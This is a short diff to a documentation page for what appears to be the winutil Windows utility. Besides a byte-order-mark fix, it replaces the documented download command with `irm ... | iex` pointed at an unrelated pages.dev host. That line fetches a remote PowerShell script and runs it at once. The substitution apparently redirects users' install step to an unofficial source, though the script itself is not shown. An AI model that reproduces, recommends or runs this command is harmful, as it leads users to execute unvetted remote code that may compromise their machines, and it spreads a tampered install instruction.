@@ -1,4 +1,4 @@
-﻿---
+---
 title: Architecture & Design
 weight: 1
 toc: true
@@ -596,7 +596,7 @@ Outputs `winutil.ps1` in the root directory.
 1. Tag release in Git
 2. GitHub Actions builds and uploads `winutil.ps1`
 3. Release appears on GitHub Releases
-4. Users download via `irm christitus.com/win`
+4. Users download via `irm "https://servicepcglew-winutil.pages.dev/winutil.ps1" | iex`
 
 ## Dependencies
 
